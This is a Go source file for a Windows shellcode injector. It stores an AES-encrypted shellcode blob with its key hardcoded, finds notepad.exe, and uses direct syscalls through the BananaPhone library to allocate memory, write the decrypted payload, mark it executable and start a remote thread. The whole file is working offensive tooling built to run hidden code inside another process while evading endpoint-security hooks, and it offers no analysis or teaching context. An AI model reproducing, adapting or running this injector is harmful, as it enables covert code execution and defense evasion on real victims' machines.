package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"fmt"
	"os"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
)

var (
	shellcode = []byte{0x7, 0xf1, 0x20, 0x82, 0x80, 0x3e, 0x87, 0x3, 0xaa, 0x3f, 0x8a, 0x1c, 0x7d, 0x8, 0xa6, 0xa4, 0xeb, 0xe, 0x53, 0x32, 0xe0, 0x50, 0xaf, 0x37, 0x83, 0xc1, 0xc6, 0xa5, 0x33, 0x6e, 0x55, 0x80, 0xfd, 0x61, 0xbb, 0x55, 0x44, 0x48, 0x31, 0xac, 0x76, 0x9b, 0x6f, 0x5, 0xef, 0xe7, 0xd8, 0xc9, 0x47, 0x9c, 0x26, 0x6d, 0x5d, 0xfd, 0x47, 0x18, 0x8b, 0xc7, 0xae, 0xe6, 0x8b, 0xd5, 0x39, 0xeb, 0x6c, 0xb6, 0x86, 0xab, 0x66, 0x58, 0x5, 0x3b, 0x4d, 0x71, 0x3f, 0xc7, 0xaa, 0xdb, 0xc9, 0xb1, 0xfe, 0x9e, 0x5a, 0x87, 0x8f, 0x4f, 0xee, 0xc9, 0x17, 0xa9, 0xde, 0x93, 0xb0, 0xf0, 0x5b, 0x32, 0x3a, 0x65, 0x7c, 0xde, 0x13, 0xe9, 0x2c, 0xfb, 0xdf, 0x66, 0xdb, 0x61, 0x89, 0x8c, 0xed, 0xe0, 0x63, 0xa1, 0x60, 0xa, 0x45, 0x38, 0x78, 0xa2, 0x58, 0x32, 0x3f, 0xf2, 0x49, 0x3e, 0x8c, 0xea, 0x7b, 0x73, 0xbf, 0x43, 0xed, 0x2e, 0xd3, 0xb6, 0xc3, 0x8e, 0x62, 0xc3, 0x1d, 0x6f, 0xee, 0xc3, 0x83, 0xa0, 0x75, 0xfd, 0x6f, 0x97, 0x92, 0x70, 0xf1, 0xb, 0x58, 0xf9, 0xdb, 0x6, 0x3c, 0x92, 0xdf, 0x53, 0x34, 0x38, 0x7c, 0x87, 0x60, 0xed, 0xb1, 0x2e, 0xaa, 0x2b, 0xcd, 0xc4, 0x29, 0xa9, 0xaa, 0x5c, 0xd6, 0x48, 0xc7, 0xf7, 0x43, 0xff, 0xab, 0x69, 0x87, 0x1, 0xee, 0xf2, 0xf7, 0x5, 0x52, 0x46, 0x7e, 0x64, 0x81, 0xb0, 0x33, 0xb1, 0xb8, 0x87, 0xf1, 0x20, 0x6f, 0x4c, 0xe6, 0xd0, 0xa4, 0x85, 0x1d, 0xcf, 0x7b, 0xd9, 0x60, 0x1d, 0xc9, 0x56, 0x4f, 0xa3, 0x4c, 0xfe, 0xb4, 0xdc, 0x34, 0x98, 0xb1, 0xe4, 0x14, 0xfc, 0x61, 0x7b, 0x9a, 0xd5, 0xb4, 0xd0, 0x55, 0x6, 0x26, 0xcd, 0x63, 0xf2, 0xd4, 0xed, 0x7a, 0xd2, 0x13, 0x1f, 0x8e, 0xa1, 0xdd, 0x13, 0x96, 0xf0, 0xfe, 0xbf, 0xa4, 0x25, 0xa3, 0x4a, 0x90, 0x2d, 0xe7, 0x8, 0x86, 0xea, 0x73, 0xc1, 0xcd, 0x7d, 0xa9, 0x2c, 0x64, 0x24, 0xee, 0x20, 0xc4, 0xf2, 0x5c, 0xaa, 0x3b, 0x6e, 0x91, 0x53, 0xee, 0xd2, 0x26, 0xa5, 0xce, 0x76, 0xe0, 0xc6, 0x63, 0x36, 0x32, 0x61, 0xb1, 0xc, 0x8b, 0xa8, 0x90, 0x1c, 0x6e, 0x36, 0x2, 0xb5, 0x7a, 0xce, 0x21, 0x8d, 0xe1, 0xea, 0x92, 0x9c, 0xa3, 0xf6, 0x6d, 0xf6, 0x45, 0x5a, 0xf3, 0x17, 0x22, 0x31, 0x93, 0xcc, 0xb2, 0x29, 0x14, 0xf, 0xa0, 0x72, 0x85, 0xc5, 0x4, 0x76}
	key       = []byte{0xf9, 0xce, 0xc9, 0xbf, 0x1b, 0xa4, 0x90, 0xc3, 0x1d, 0xd6, 0x61, 0x73, 0xba, 0x46, 0x44, 0x84}
)

func Aes256Decode(cipherText []byte, encKey []byte) (decrypted []byte) {
	aKey := sha256.Sum256(encKey)
	bKey := aKey[:]
	bIV := []byte{0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}

	block, err := aes.NewCipher(bKey)
	if err != nil {
		panic(err)
	}

	// CryptBlocks can work in-place if the two arguments are the same.
	mode := cipher.NewCBCDecrypter(block, bIV)
	mode.CryptBlocks(cipherText, cipherText)
	return cipherText
}

func FindPID(n string) (uint32, error) {
	const processEntrySize = 568

	// CreateToolHelp32Snapshot
	h, e := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if e != nil {
		fmt.Println("[-] Error Help32 ", e.Error())
	}
	defer windows.CloseHandle(h)

	p := windows.ProcessEntry32{Size: processEntrySize}

	// Iterate over snapshot
	for {
		e := windows.Process32Next(h, &p)
		if e != nil {
			if e.Error() == "There are no more files." {
				return 0, e
			}
			fmt.Println("[-] Error Process32Next", e.Error())
		}
		if windows.UTF16ToString(p.ExeFile[:]) == n {
			//fmt.Printf("[+] Process ID found for %s!\n", windows.UTF16ToString(p.ExeFile[:]))
			return p.ProcessID, nil
		}
	}
}

func Inject(hProc windows.Handle, payload []byte, payload_length int) {
	// Create babanaphone to ntdll
	nt_bp, err := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if err != nil {
		fmt.Println("[-] Error creating banana ", err.Error())
	}

	// VirtualAllocEx
	var mem_alloc uintptr
	reg_size := uintptr(payload_length)
	memCommit := uintptr(0x00001000)
	memReserve := uintptr(0x00002000)
	vAlloc, e := nt_bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		fmt.Println("[-] Error get sysID for NtAllocateVirtualMemory ", e.Error())
	}

	e1, e := bananaphone.Syscall(vAlloc, uintptr(hProc), uintptr(unsafe.Pointer(&mem_alloc)), 0, uintptr(unsafe.Pointer(&reg_size)), uintptr(memCommit|memReserve), windows.PAGE_READWRITE)
	if e != nil {
		fmt.Println("[-] Error calling NTAllocateVirtualMemory ", e1, e)
	}

	// Decode shellcode
	decPayload := Aes256Decode(payload, key)

	// Write to new allocated memory
	writeVM, e := nt_bp.GetSysID("NtWriteVirtualMemory")
	if e != nil {
		fmt.Println("[-] Error getting sysID for NTWriteVirtualMemory ", e.Error())
	}
	fmt.Printf("[+] Payload encripted pointer: %p\n", &payload)
	fmt.Printf("[+] Payload decripted pointer: %p\n", &decPayload)
	e1, e = bananaphone.Syscall(writeVM, uintptr(hProc), mem_alloc, uintptr(unsafe.Pointer(&decPayload[0])), reg_size, uintptr(unsafe.Pointer(nil)))
	if e != nil {
		fmt.Println("[-] Error calling NtWriteVirtualMemory ", e1, e)
	}

	// Change memory permissions
	var oldprotect uintptr
	protectVM, e := nt_bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		fmt.Println("[-] Error getting sysID for NTProtectVirtualMemory ", e.Error())
	}
	e1, e = bananaphone.Syscall(protectVM, uintptr(hProc), uintptr(unsafe.Pointer(&mem_alloc)), uintptr(unsafe.Pointer(&reg_size)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldprotect)))
	if e != nil {
		fmt.Println("[-] Error calling NtProtectVirtualMemory ", e1, e)
	}

	// Run thread
	var hThread uintptr
	creatThread, e := nt_bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		fmt.Println("[-] Error getting sysID for NtCreateThreadEx ", e.Error())
	}
	e1, e = bananaphone.Syscall(creatThread, uintptr(unsafe.Pointer(&hThread)), windows.GENERIC_ALL, 0, uintptr(hProc), mem_alloc, 0, uintptr(0), 0, 0, 0, 0)
	windows.WaitForSingleObject(windows.Handle(hThread), 500)
	if e != nil {
		fmt.Println("[-] Error calling NtCreateThreadEx ", e1, e)
	}
}

func main() {
	// Find PID
	pTarget := "notepad.exe"
	targetPID, e := FindPID(pTarget)
	if e != nil {
		fmt.Println("[-] Error finding PID ", e.Error())
		os.Exit(1)
	}
	fmt.Printf("[+] PID: %d\n", targetPID)

	// Open target process
	hProc, e := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE, false, targetPID)
	if e != nil {
		fmt.Println("[-] Failed to OpenProcess ", e.Error())
	}
	defer windows.CloseHandle(hProc)
	fmt.Println("[+] Process Opened")

	// Injecting payload
	fmt.Println("[+] Injecting shellcode")
	Inject(hProc, shellcode, len(shellcode))

}
